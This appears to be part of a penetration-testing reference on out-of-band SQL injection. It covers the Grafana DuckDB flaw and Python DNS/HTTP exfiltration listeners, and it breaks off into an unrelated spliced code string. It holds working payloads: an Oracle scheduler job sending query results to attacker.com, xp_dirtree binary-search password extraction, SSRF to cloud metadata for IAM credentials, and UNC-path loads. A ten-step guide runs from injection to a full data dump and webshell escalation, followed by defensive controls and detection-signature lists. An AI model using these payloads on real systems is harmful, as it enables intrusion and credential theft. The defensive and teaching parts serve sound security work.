**Impact chain**: Viewer account (lowest privilege) -> Grafana SQL Expression -> DuckDB CLI execution -> arbitrary file read (\`/etc/passwd\`, \`/etc/shadow\`, Grafana config, TLS private keys) + HTTP OOB exfiltration + environment variable extraction (database URLs, API keys, cloud credentials) + S3 credential-bearing exfiltration + RCE via \`shellfs\` extension.

**The Patch:**

Grafana **completely removed the SQL Expressions feature** and all DuckDB integration. The feature was not patched -- it was ripped out entirely. It was later re-introduced using \`go-mysql-server\` (Dolthub's in-process Go SQL engine) with a strict **function allowlist** (\`pkg/expr/sql/parser_allow.go\`) that permits only safe operations: aggregations, string functions, date operations, JSON processing, math, and window functions. No filesystem functions, no HTTP functions, no extension loading. The replacement explicitly rejects any function not on the allowlist.

This architectural decision -- replacing an embedded database with full OS access with a sandboxed SQL engine with a function allowlist -- is the correct defense pattern for any application embedding DuckDB or similar embedded databases in user-facing SQL contexts.

#### DuckDB Security Controls (and Their Gaps)

DuckDB provides configuration settings to restrict its capabilities. However, these are **opt-in** -- the default configuration enables everything:

| Setting | Default | Effect When Restrictive |
|---------|---------|------------------------|
| \`enable_external_access\` | **true** | When \`false\`: disables ATTACH, COPY, all \`read_*\` functions for external sources. **Primary kill switch.** |
| \`lock_configuration\` | **false** | When \`true\`: prevents further config changes (immutable security posture). Must be set AFTER other restrictions. |
| \`allow_community_extensions\` | **true** | When \`false\`: blocks \`shellfs\`, \`http_request\`, \`httpserver\`, and all community-sourced extensions. |
| \`autoinstall_known_extensions\` | **true** | When \`false\`: prevents automatic extension download on first use. |
| \`autoload_known_extensions\` | **true** | When \`false\`: requires explicit \`LOAD\` before extension functions work. |
| \`disabled_filesystems\` | *empty* | Set to \`LocalFileSystem\` to block local file reads while allowing HTTP. |
| \`allowed_directories\` | *unrestricted* | Fine-grained file path ACLs. |
| \`allow_unsigned_extensions\` | **false** | When \`true\`: allows loading arbitrary \`.duckdb_extension\` binaries from any path or URL. |

**Known security bypass:** \`sniff_csv()\` was discovered to provide filesystem access even when \`enable_external_access=false\` (GHSA-w2gf-jxc9-pf2q). Pandas/NumPy replacement scans were also not disabled by \`enable_external_access=false\` (GitHub issue #12114). These gaps demonstrate that security settings in embedded databases may have coverage holes that traditional RDBMS access controls (tested over decades) do not.

**The fundamental problem:** Every application that embeds DuckDB must explicitly configure these settings. The DuckDB documentation warns: "DuckDB should be treated like code in Bash or Python -- do not execute SQL from untrusted sources without proper sandboxing." But the default configuration trusts everything. Most developers embedding DuckDB in data tools never configure these settings because DuckDB "just works" out of the box -- with full filesystem and network access enabled.

#### The Modern Data Stack as an OOB Attack Surface

CVE-2024-9264 is not an isolated incident. DuckDB is embedded across the modern data and analytics ecosystem. Every tool on this list runs DuckDB in-process with the host application's permissions. If user-controlled input reaches DuckDB SQL execution without parameterization, the full OOB surface documented above is available.

**dbt (data build tool):**
dbt-duckdb uses DuckDB as a local development database. dbt compiles Jinja2 templates into SQL and executes them. The injection vector is the dbt **package supply chain** -- a malicious dbt package can override adapter macros to inject arbitrary SQL that executes with DuckDB's full capabilities (file access, httpfs, cloud credentials). A compromised dbt macro running \`SELECT * FROM read_csv_auto('/etc/passwd')\` executes with the data engineer's local permissions, including access to their AWS credentials, SSH keys, and source code. This affects both dbt-core (local) and dbt Cloud (hosted).

**Jupyter Notebooks:**
DuckDB is a popular in-notebook SQL engine via \`duckdb.sql()\` or the JupySQL \`%%sql\` magic. DuckDB in a notebook runs with the **full privileges of the notebook kernel user** -- often a service account with cloud IAM roles for data lake access. Shared notebooks with parameterized cells that interpolate user input into DuckDB SQL are injection vectors. A single malicious cell in a shared Jupyter environment can exfiltrate the entire cloud credential set.

**BI Tools (Metabase, Superset, Redash):**
All three support DuckDB connections and custom SQL queries. Metabase's community DuckDB driver connects to local DuckDB files. Superset uses SQLAlchemy with \`duckdb-engine\`. Custom SQL in dashboards -- a feature designed for analyst flexibility -- becomes an OOB injection surface when parameters are user-controllable. The DuckDB engine has no additional sandboxing beyond what the BI tool provides.

**Apache Airflow / Dagster / Prefect:**
DuckDB operators in DAG definitions process data locally. If DAG parameters derive from untrusted input (API triggers, webhook payloads, user-submitted configurations), DuckDB SQL injection enables OOB exfiltration from the orchestrator's execution environment -- which typically has broad cloud access for pipeline execution.

**Evidence.dev:**
SQL-based reporting framework that uses DuckDB as its default data source. SQL queries are written directly in Markdown files. If a developer can modify the SQL in Evidence reports (through repo access or a supply chain attack on the report template), they have access to DuckDB's full capability set.

**Streamlit / Gradio:**
Data applications commonly use \`duckdb.sql()\` or \`connection.execute()\` with user-provided filter values interpolated into SQL strings. Classic SQL injection in a DuckDB context escalates from data disclosure to full file system access and HTTP OOB exfiltration.

**MotherDuck (Cloud DuckDB):**
Hybrid execution model where queries run partly on the client and partly in the cloud. The local execution portion retains full local file system access. The cloud portion runs in an isolated "Duckling" (dedicated DuckDB instance) with SOC 2 Type II controls. The OOB implications depend on which portion of the query runs where -- a query reading local files executes locally with local privileges, while cloud-side computation is sandboxed.

**DuckDB-WASM (Browser):**
DuckDB compiled to WebAssembly for browser execution. The browser sandbox **neutralizes all OOB vectors**: no local filesystem access beyond OPFS (Origin Private File System), all HTTP requests go through the browser's fetch API with CORS restrictions, no shell execution, no cloud credential access. DuckDB-WASM is the one deployment context where embedded OOB does not apply.

#### Why This Matters: The Invisible Database Problem

The security industry has spent two decades building defenses against database OOB: network segmentation isolates database servers, egress filtering blocks outbound connections from database hosts, database activity monitoring alerts on calls to dangerous functions, and DBAs revoke privileges from application accounts. These defenses assume the database is a distinct, identifiable, network-visible entity.

DuckDB -- and the broader trend toward embedded analytical databases -- invalidates all of these assumptions. The database is invisible to network monitoring because it shares the application's network identity. The database is invisible to process monitoring because it runs inside the application process. The database is invisible to database activity monitoring because there is no database server to monitor. And the database's "DBA" is a developer who may not even know they are running a database -- they just called \`duckdb.sql()\` to query a CSV file.

This is not a DuckDB-specific problem. It is a category problem. As embedded databases with network capabilities proliferate (DuckDB, Polars with cloud connectors, DataFusion, Velox), the attack surface for OOB SQL injection expands into contexts where traditional SQL injection defenses are not deployed because nobody thinks of these tools as "databases" in the traditional sense. The developer building a Streamlit dashboard does not configure database firewalls. The data engineer writing dbt models does not review Oracle network ACLs. The analyst building a Metabase dashboard does not revoke \`xp_dirtree\` privileges. They are using "analytics tools" -- not "databases." But the OOB capability is identical.

The defense pattern established by Grafana's CVE-2024-9264 patch is the template: replace the embedded database in user-facing SQL contexts with a **sandboxed SQL engine** that has an explicit **function allowlist**. Never expose DuckDB's full SQL surface to user input. If DuckDB must process user-influenced queries, set \`enable_external_access=false\` and \`lock_configuration=true\` before any user SQL executes. Treat DuckDB SQL with the same caution as unsandboxed code execution -- powerful, useful, and catastrophically dangerous if it processes untrusted input.

### Custom OOB Listener Setup

#### DNS Listener (Python + dnslib)

\`\`\`python
#!/usr/bin/env python3
"""OOB DNS listener -- captures exfiltrated data from SQL injection DNS callbacks.
Logs all subdomain queries with timestamps. Decodes hex-encoded labels."""

from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A
import sys
import datetime
import binascii

class OOBResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip('.')
        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
        labels = qname.split('.')
        data_labels = '.'.join(labels[:-2])  # strip base domain

        if data_labels:
            print(f"[{ts}] RAW: {data_labels}  (full: {qname})")
            # Attempt hex decode
            try:
                clean = data_labels.replace('.', '')
                decoded = binascii.unhexlify(clean).decode('utf-8', errors='replace')
                print(f"[{ts}] HEX: {decoded}")
            except (ValueError, binascii.Error):
                pass

        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
        return reply

if __name__ == '__main__':
    domain = sys.argv[1] if len(sys.argv) > 1 else "oob.example.com"
    print(f"[*] OOB DNS listener on UDP/53 for *.{domain}")
    print(f"[*] Waiting for DNS callbacks...")
    server = DNSServer(OOBResolver(), port=53, address="0.0.0.0")
    server.start()

#!/usr/bin/env python3
"""OOB HTTP listener -- captures exfiltrated data from HTTP callbacks.
Logs URL path, query parameters, and POST body as exfiltrated data."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
import sys
import urllib.parse

class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        print(f"[{ts}] GET  Path: {parsed.path}")
        if params:
            for k, v in params.items():
                print(f"[{ts}]      {k} = {v[0]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        print(f"[{ts}] POST Body: {body}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # suppress default access log

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"[*] OOB HTTP listener on :{port}")
    print(f"[*] Waiting for HTTP callbacks...")
    HTTPServer(("0.0.0.0", port), OOBHandler).serve_forever()

#!/usr/bin/env python3
"""Reassemble chunked OOB DNS exfiltration data.
Input: one DNS query per line (from listener output).
Format: SEQUENCE.HEXDATA.base.domain.com"""

import binascii
import sys

queries = {}
for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    parts = line.split('.')
    if len(parts) >= 4:
        try:
            seq = int(parts[0])
            hexdata = parts[1]
            queries[seq] = hexdata
        except (ValueError, IndexError):
            continue

result = b''
for seq in sorted(queries.keys()):
    try:
        result += binascii.unhexlify(queries[seq])
    except binascii.Error:
        result += queries[seq].encode()

print(f"Extracted ({len(result)} bytes): {result.decode('utf-8', errors='replace')}")

### DNS Binary Search

When the injection context only allows triggering an OOB callback (yes/no DNS hit) without embedding data in the subdomain, use binary search on ASCII values:

\`\`\`
Goal: Extract first character of administrator's password.

Step 1: IF ASCII(SUBSTRING(password,1,1)) > 64 EXEC xp_dirtree '\\\\hit.oob.attacker.com\\x'
  -> DNS hit = YES, char > '@' (ASCII 64)

Step 2: IF ASCII(SUBSTRING(password,1,1)) > 96
  -> DNS hit = YES, char > '\`' (lowercase range)

Step 3: IF ASCII(SUBSTRING(password,1,1)) > 112
  -> No hit = NO, char <= 'p'

Step 4: IF ASCII(SUBSTRING(password,1,1)) > 104
  -> DNS hit = YES, char > 'h'

Step 5: IF ASCII(SUBSTRING(password,1,1)) > 108
  -> No hit = NO, char <= 'l'

Step 6: IF ASCII(SUBSTRING(password,1,1)) > 106
  -> DNS hit = YES, char > 'j'

Step 7: IF ASCII(SUBSTRING(password,1,1)) > 107
  -> No hit = NO, char is 107 = 'k'

7 queries per character (log2(128) = 7).
\`\`\`

| Method | Queries per char | Data in subdomain? | Speed | Use when |
|--------|-----------------|-------------------|-------|----------|
| Direct hex encoding | 1 per ~30 chars | Yes | Fastest | Can embed data in subdomain |
| Chunked exfiltration | 1 per chunk | Yes | Fast | Large data, need ordering |
| Binary search | 7 per char | No (hit/no-hit) | Slow | Can only trigger OOB, cannot embed data |
| Bit-by-bit | 8 per char | No (hit/no-hit) | Slowest | Extreme filtering, last resort |

### Level 5: Cloud Metadata via OOB, OAST Methodology, Cl0p Playbook Analysis

#### Cloud Metadata via OOB Chain (SSRF)

When the database runs on a cloud instance (AWS EC2, Azure VM, GCP Compute), OOB functions can reach the cloud metadata service:

\`\`\`sql
-- Oracle: SSRF to AWS metadata via UTL_HTTP
SELECT UTL_HTTP.REQUEST(
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
) FROM dual

-- MSSQL: SSRF via xp_cmdshell + curl
EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'

-- DuckDB: SSRF via read_csv_auto
SELECT * FROM read_csv_auto(
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
)
\`\`\`

If the instance has an IAM role attached, the metadata service returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token). These credentials provide access to whatever AWS services the role permits -- S3 buckets, Lambda functions, DynamoDB tables, or the entire AWS account.

#### Asynchronous OOB (Fire-and-Forget)

Some injection contexts execute queries asynchronously -- the SQL runs after the HTTP response has already been sent. Boolean and time-based techniques fail completely because there is no response timing to measure. OOB works because the outbound DNS/HTTP request is independent of the response lifecycle:

\`\`\`sql
-- Oracle: asynchronous job execution with OOB callback
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'exfil_job',
    job_type => 'PLSQL_BLOCK',
    job_action => q'[BEGIN
      UTL_HTTP.REQUEST('http://attacker.com/?data=' || (SELECT user FROM dual));
    END;]',
    enabled => TRUE
  );
END;
\`\`\`

The query is submitted and the HTTP response returns immediately. Minutes later, the database scheduler executes the job, and the OOB callback arrives at the attacker's server.

#### OAST Methodology (PortSwigger)

PortSwigger coined the term OAST -- Out-of-Band Application Security Testing -- to describe the systematic use of OOB interaction payloads for vulnerability detection. The methodology:

1. **Instrument every input**: Insert unique OOB payloads (Collaborator/interactsh subdomains) into every testable parameter, header, and cookie
2. **Wait for callbacks**: Monitor the OOB listener for any interactions from the target
3. **Correlate**: Match each callback to the specific payload/input that triggered it
4. **Zero false positives**: If the OOB server receives a callback, the vulnerability exists -- there is no ambiguity, no noise, no statistical uncertainty

This is fundamentally different from response-based testing. Boolean blind requires distinguishing between identical-looking responses. Time-based blind must filter network jitter from injected delays. OAST either gets a callback or it does not. PortSwigger's Collaborator Everywhere Burp extension applies this methodology passively to all web traffic.

#### Cl0p Breach Playbook Analysis

The Cl0p ransomware group perfected a repeatable SQLi-to-OOB-exfiltration playbook across two of the largest data breaches in history:

**MOVEit Transfer (CVE-2023-34362, May-June 2023)**:
1. SQL injection in \`/human.aspx\` endpoint (MSSQL backend)
2. Deploy LEMURLOOT webshell (\`human2.aspx\`) via SQLi -- filename chosen to blend with legitimate \`human.aspx\`
3. Webshell serves as persistent OOB exfiltration channel -- browse file systems, download files over HTTPS
4. Pure data exfiltration -- no ransomware encryption, no lateral movement
5. Scale: 3,000+ US entities, 8,000+ organizations globally, ~94 million individuals affected

**Accellion FTA (CVE-2021-27101, Dec 2020 - Feb 2021)**:
1. SQL injection via crafted Host header in \`document_root.html\`
2. Deploy DEWMODE webshell on compromised FTA servers
3. Webshell enables file system browsing and file download -- persistent OOB channel
4. Stolen data published on Cl0p leak site for extortion
5. Scale: ~100 organizations attacked, ~25 significant data theft (Shell, Kroger, Morgan Stanley, Qualys, Singtel, Reserve Bank of New Zealand)

**The pattern**: Both attacks follow identical operational logic. SQLi provides initial access. A webshell provides persistent OOB exfiltration. The injection point and the exfiltration channel are deliberately separated. The application logs the HTTP request that triggered the injection, but the data theft happens through the webshell -- a different URL, a different code path, a different monitoring blind spot. This separation is the defining characteristic of OOB in an APT context.

## Exploitation (10 Steps: OOB Confirmation to Full Data Dump)

### Step 1: Identify Injection Point
Find a parameter, cookie, or header that is interpolated into a SQL query. Confirm injection exists via standard techniques (error, boolean, syntax break).

### Step 2: Determine Database Type
Fingerprint the backend: \`@@version\` (MSSQL), \`banner FROM v$version\` (Oracle), \`version()\` (MySQL/PG). Use error message syntax or conditional timing if blind.

### Step 3: Set Up OOB Listener
Launch Burp Collaborator or interactsh. Record the unique callback domain.

### Step 4: Confirm OOB Connectivity
Inject the minimum viable OOB payload for the identified database (see Detection and Validation section). Verify DNS/HTTP interaction arrives at the listener.

### Step 5: Enumerate Databases
Extract database names via OOB subdomain encoding. MSSQL: \`master..sysdatabases\`. Oracle: \`all_users\` or \`v$database\`. PostgreSQL: \`pg_database\`.

### Step 6: Enumerate Tables
Extract table names for the target database. Iterate with OFFSET or ROWNUM to cycle through tables one per DNS query.

### Step 7: Enumerate Columns
Extract column names for high-value tables (users, credentials, sessions, payments).

### Step 8: Extract Sensitive Data
Extract passwords, tokens, PII from identified columns. Use hex encoding and chunking for large values.

### Step 9: Escalate Access (Stager)
If the data volume justifies it, pivot to the Stager technique: enable xp_cmdshell, write a webshell, or create a database user for direct connection.

### Step 10: Document Evidence
Record every OOB interaction with timestamps, DNS query logs, HTTP request logs, and the SQL payloads that triggered them. Screenshots of Collaborator/interactsh output. This is the evidence that proves exploitation.

## Variations and Edge Cases

### Windows-Only Techniques (UNC Path Dependency)

UNC paths (\`\\\\hostname\\share\`) are a Windows-specific mechanism. They trigger SMB connections that include DNS resolution. Functions that accept file paths (xp_dirtree, LOAD_FILE, lo_export, ATTACH DATABASE) only trigger OOB callbacks when the underlying OS resolves UNC paths.

**Impact**: MySQL on Linux has effectively zero OOB capability. PostgreSQL on Linux uses COPY TO PROGRAM (OS commands) instead of UNC paths. MSSQL on Linux (since 2017) cannot use UNC-based OOB functions -- xp_cmdshell with nslookup/curl is required instead.

### Oracle ACL Restrictions and Bypasses

Since Oracle 12c, network utility packages (UTL_HTTP, UTL_INADDR, UTL_TCP, UTL_SMTP) require explicit network ACL grants. Without them, calls raise \`ORA-24247\` (network access denied by access control list).

**Bypass order**:
1. DBMS_LDAP.INIT -- often granted to PUBLIC, not covered by same ACL
2. XMLType XXE -- uses XML parser, separate code path from network ACLs (unpatched only)
3. SYS.DBMS_LDAP.INIT -- SYS schema variant may have different grants
4. DBMS_XMLGEN -- XML generation with embedded external entities

### MySQL Linux Limitation

PentestMonkey explicitly notes DNS exfiltration from MySQL on Linux is "Impossible?" via standard SQL functions. The only path: deploy a UDF (User Defined Function) compiled as a shared library (\`.so\`) that implements network operations. This requires write access to \`@@plugin_dir\` and the CREATE FUNCTION privilege -- both significant barriers.

### PostgreSQL Superuser Requirement

COPY TO PROGRAM requires superuser. Starting with PostgreSQL 11, the \`pg_execute_server_program\` role can also execute it. However, most PostgreSQL deployments do not grant this role to application-level users. If superuser is not available, the only OOB path is dblink (requires extension installation + DBA privileges).

### SQLite -- Effectively No OOB

SQLite runs in-process with no server daemon and no built-in networking. The only OOB paths are:
- \`ATTACH DATABASE '//attacker.com/z' AS z\` -- Windows only, UNC path
- \`load_extension('\\\\attacker.com\\share\\evil.dll')\` -- Windows only, disabled by default

For practical purposes, SQLite has no OOB capability.

### DuckDB Embedded OOB (Novel)

DuckDB's in-process architecture means OOB happens through legitimate features (HTTP fetch, S3 access) rather than utility functions. No special privileges needed -- if the application allows SQL expressions to reach DuckDB, full OOB capability is available. See the dedicated DuckDB subsection under Level 4 Techniques.

### Asynchronous OOB (Fire-and-Forget)

Some applications execute SQL asynchronously -- the query is submitted to a queue and processed after the HTTP response is sent. Boolean blind and time-based blind both fail because there is no response timing to measure. OOB is the only technique that works because the outbound callback is independent of the web response lifecycle.

### DNS over HTTPS (DoH) Exfiltration

If the database host uses DNS over HTTPS resolvers (Cloudflare 1.1.1.1, Google 8.8.8.8 via DoH), traditional DNS monitoring at the network perimeter will not see the exfiltration queries -- they are encrypted inside HTTPS. This makes OOB exfiltration even harder to detect but does not change the attacker's methodology.

## Modern Stack Specifics

### DuckDB in Analytics Pipelines

> **See also:** The dedicated DuckDB subsection under Level 4 Techniques provides comprehensive coverage of the embedded OLAP OOB paradigm, including CVE-2024-9264 complete analysis, DuckDB security controls and their gaps, function surface reference, modern data stack attack surface analysis, and the "invisible database problem."

DuckDB is increasingly embedded in data engineering tools. In every case, it runs in-process with the host application's permissions, cloud credentials, and file system access. The injection patterns vary by tool:

- **dbt (data build tool)**: Jinja2-to-SQL compilation. Supply chain attack via malicious dbt package overriding adapter macros executes with DuckDB's full capabilities including \`read_csv_auto()\`, httpfs, and S3 credential access
- **Jupyter Notebooks**: \`duckdb.sql()\` or JupySQL \`%%sql\` magic. Runs as kernel user -- often a service account with IAM roles for data lake access
- **BI Tools (Metabase, Superset, Redash)**: Custom SQL queries in dashboards. DuckDB engine has no sandboxing beyond what the BI tool provides
- **Apache Airflow / Dagster / Prefect**: DuckDB operators in DAGs. Untrusted DAG parameters (API triggers, webhooks) enable OOB from the orchestrator's execution environment
- **Evidence.dev**: SQL-based reporting with DuckDB as default data source. SQL in Markdown files
- **Streamlit / Gradio**: Data apps with user-provided filter values interpolated into \`duckdb.sql()\` calls
- **MotherDuck**: Hybrid execution -- local queries retain full local permissions, cloud queries are sandboxed
- **DuckDB-WASM (Browser)**: Browser sandbox **neutralizes all OOB vectors** -- no filesystem, CORS restrictions on HTTP, no shell execution

The common pattern: DuckDB runs in-process, inheriting the host application's network access, file system permissions, and cloud credentials. There is no database-level firewall to configure. The defense pattern from Grafana's CVE-2024-9264 patch applies: use a sandboxed SQL engine with a function allowlist, or set \`enable_external_access=false\` and \`lock_configuration=true\` before any user-influenced SQL executes.

### Cloud-Native Databases (OOB Limitations)

| Cloud Service | OOB Status | Notes |
|--------------|------------|-------|
| AWS RDS (MSSQL) | Limited | xp_cmdshell disabled, no sysadmin, but xp_dirtree may work |
| AWS RDS (PostgreSQL) | Blocked | COPY TO PROGRAM disabled, no superuser |
| AWS RDS (Oracle) | Restricted | Network ACLs managed by AWS, limited UTL_HTTP access |
| AWS Aurora | Restricted | Lambda integration may provide alternative OOB path |
| Azure SQL | Limited | Similar to RDS -- most OOB functions disabled |
| GCP Cloud SQL | Restricted | Managed environment limits OOB functions |
| Supabase (PostgreSQL) | Blocked | COPY TO PROGRAM disabled, but dblink may be available |

**Key insight**: Managed cloud databases disable the most dangerous OOB functions (xp_cmdshell, COPY TO PROGRAM) but may leave lower-privilege UNC-path functions (xp_dirtree, xp_fileexist) accessible.

### Serverless Functions as OOB Targets

Lambda/Cloud Functions that execute SQL (via connection pooling to RDS) may produce OOB callbacks that originate from the Lambda execution environment's NAT gateway IP -- not the database server IP. This complicates detection correlation but does not prevent exfiltration.

### Container Network Policies

Kubernetes NetworkPolicy and Docker network isolation can block OOB by restricting egress from database containers. However:
- DNS (port 53) is usually allowed for service discovery
- CoreDNS/kube-dns proxying makes DNS exfiltration queries look like legitimate cluster DNS traffic
- Without explicit egress deny rules, all outbound traffic is permitted by default

### Enterprise CVEs (10)

#### CVE-2023-48788 -- Fortinet FortiClientEMS (CVSS 9.8)
Unauthenticated SQLi in DAS component against MSSQL backend. Exploitation uses stacked queries to re-enable xp_cmdshell (\`sp_configure\`) and execute arbitrary commands. Webhook.site used as OOB callback for target validation. CISA KEV listed. Active exploitation confirmed by Kaspersky (October 2024). Horizon3.ai published complete PoC chain.

#### CVE-2024-43468 -- Microsoft SCCM (CVSS 9.8)
> **Cross-reference**: Also documented on [01-Classic-In-Band.md](01-Classic-In-Band.md) as a classic stacked-query SQLi. OOB relevance documented here as primary.

Unauthenticated SQLi in MP_Location service. Queries execute as the SCCM machine account with sysadmin role on MSSQL. All OOB techniques (xp_dirtree DNS, xp_cmdshell, OLE Automation) directly applicable with maximum privilege. Synacktiv PoC released November 2024. CISA KEV added February 2026.

#### CVE-2024-8924 -- ServiceNow (CVSS 8.7)
> **Cross-reference**: Also documented on [04-Boolean-Based-Blind.md](04-Boolean-Based-Blind.md) as a boolean-based blind SQLi. OOB relevance documented here for DNS exfiltration path.

Unauthenticated blind SQLi in core Now Platform. Boolean-based and time-based confirmed. OOB/DNS exfiltration is the optimal exploitation path for data extraction at scale from this blind vector.

#### CVE-2024-6670 -- Progress WhatsUp Gold (CVSS 9.8)
Pre-auth SQLi in \`HasErrors\` method enables admin password change. MSSQL backend with xp_dirtree/xp_cmdshell OOB chains directly applicable. Active RCE attacks since August 2024 (Trend Micro). CISA KEV listed. Metasploit module published.

#### CVE-2023-34362 -- MOVEit Transfer (CVSS 9.8)
> **Cross-reference**: Also documented on [01-Classic-In-Band.md](01-Classic-In-Band.md) as the largest SQLi breach in history and on [04-Boolean-Based-Blind.md](04-Boolean-Based-Blind.md) with context note. OOB exfiltration channel analysis is primary here.

SQLi in \`/human.aspx\` against MSSQL backend. Cl0p ransomware group deployed LEMURLOOT webshell as persistent OOB exfiltration channel. 3,000+ US entities, 8,000+ organizations globally, ~94 million individuals. The defining SQLi-to-OOB breach chain of the decade.

#### CVE-2024-42327 -- Zabbix Server (CVSS 9.9)
SQLi in \`CUser.get\` API function (\`addRelatedObjects\`). Exploitable by any user with API access (default User role). Supports MySQL, PostgreSQL, and Oracle backends. Oracle deployments enable UTL_HTTP/UTL_INADDR OOB. PostgreSQL deployments enable COPY TO with DNS exfiltration.

#### CVE-2021-27101 -- Accellion FTA (CVSS 9.8)
SQLi via crafted Host header. FIN11/Cl0p deployed DEWMODE webshell as persistent OOB channel. ~100 organizations attacked, ~25 significant data theft (Shell, Kroger, Morgan Stanley, Qualys, Singtel, Reserve Bank of New Zealand).

#### CVE-2024-9264 -- Grafana DuckDB (CVSS 9.9/8.8)
SQL expression injection via DuckDB CLI in Grafana 11.x. Viewer-level access (lowest auth). Requires DuckDB binary on server. DuckDB httpfs enables HTTP OOB exfiltration, \`read_blob\`/\`read_text\` enable arbitrary file read, \`getenv\` extracts environment variables, \`shellfs\` community extension enables RCE. Grafana removed the entire feature in the patch and replaced it with a sandboxed SQL engine with function allowlist. Affected: 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1. See dedicated DuckDB subsection under Level 4 Techniques for complete analysis.

#### CVE-2024-36412 -- SuiteCRM (CVSS 10.0)
Perfect CVSS score. Unauthenticated SQLi in \`responseEntryPoint\` via \`event\` parameter. CRM databases contain high-value PII. OOB techniques enable stealthy extraction of customer records without application-layer logging.

#### CVE-2024-21080 -- Oracle E-Business Suite (CVSS 6.5)
SQLi in REST Services component. Oracle-native target -- UTL_HTTP, UTL_INADDR, DBMS_LDAP, and HTTPURITYPE OOB techniques directly applicable. EBS contains financial, HR, and supply chain data.

## Defensive Countermeasures

### Network-Level Defenses

| Control | Effectiveness | Notes |
|---------|--------------|-------|
| **Egress filtering on DB servers** | HIGH | Block all outbound DNS/HTTP/SMB from database hosts. Route DNS through internal-only resolvers. |
| **DNS monitoring** | HIGH | Alert on DNS queries from database server IPs to novel/external domains. Database servers should rarely be DNS-active. |
| **Network segmentation** | HIGH | Isolate database servers in a dedicated VLAN with no direct internet access. |
| **Block SMB outbound (port 445)** | MEDIUM | Prevents UNC-based exfiltration but not DNS or HTTP OOB. |
| **DNS sinkhole for anomalous queries** | MEDIUM | Detect unusual subdomain lengths (>20 chars), hex patterns, high entropy labels. |

### Database-Level Defenses

| Control | Database | Notes |
|---------|----------|-------|
| Disable xp_cmdshell | MSSQL | \`sp_configure 'xp_cmdshell', 0; RECONFIGURE;\` |
| Disable OLE Automation | MSSQL | \`sp_configure 'Ole Automation Procedures', 0;\` |
| Disable Ad Hoc Distributed Queries | MSSQL | Blocks OPENROWSET |
| Revoke EXECUTE on xp_dirtree from PUBLIC | MSSQL | \`REVOKE EXECUTE ON xp_dirtree TO PUBLIC\` |
| Restrict network ACLs | Oracle | Only grant UTL_HTTP/UTL_INADDR to accounts that need it |
| Revoke EXECUTE on DBMS_LDAP from PUBLIC | Oracle | Often overlooked grant |
| Disable COPY TO PROGRAM | PostgreSQL | Do not grant superuser to application accounts |
| Disable load_extension | SQLite | Default behavior -- do not enable |
| Disable httpfs extension | DuckDB | Do not install/load in production |

### Application-Level Defenses

- **Parameterized queries** -- the only complete defense against SQL injection of any type
- **Principle of least privilege** -- database connections should use accounts with minimal permissions (no sysadmin, no FILE privilege, no superuser)
- **WAF rules for OOB signatures** -- detect xp_dirtree, UTL_HTTP, DBMS_LDAP, LOAD_FILE, COPY TO PROGRAM, XMLType+DOCTYPE patterns in input
- **Audit logging on OOB functions** -- monitor database audit logs for calls to known OOB-capable functions

### OOB-Specific Detection Signatures

Monitor for these patterns in database audit logs, network traffic, and WAF logs:

**SQL-level signatures**:
- \`xp_dirtree\`, \`xp_fileexist\`, \`xp_subdirs\`, \`xp_cmdshell\` in any query
- \`UTL_HTTP\`, \`UTL_INADDR\`, \`DBMS_LDAP\`, \`HTTPURITYPE\`, \`UTL_TCP\`, \`UTL_SMTP\`
- \`EXTRACTVALUE\`, \`xmltype\`, \`DOCTYPE\`, \`ENTITY\`, \`SYSTEM\`
- \`LOAD_FILE\`, \`INTO OUTFILE\`, \`INTO DUMPFILE\`, \`LOAD DATA INFILE\`
- \`COPY TO PROGRAM\`, \`dblink\`, \`dblink_connect\`
- UNC path patterns: \`\\\\\` followed by a domain name

**DNS-level signatures**:
- DNS queries from database server IPs to unknown external domains
- Subdomain labels with unusual length (>20 chars) containing hex or base64 patterns
- Burst DNS queries to novel domains (high query rate from non-DNS-active hosts)
- DNS queries containing database artifact patterns (version strings, hash-like values)

**Network-level signatures**:
- Outbound HTTP from database server IPs to unknown external hosts
- SMB (TCP 445) connections from database servers to external IPs
- LDAP (TCP 389) connections from database servers to unknown hosts
- Known OOB interaction domains: \`*.burpcollaborator.net\`, \`*.oast.pro\`, \`*.oast.fun\`, \`*.interact.sh\`

CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> 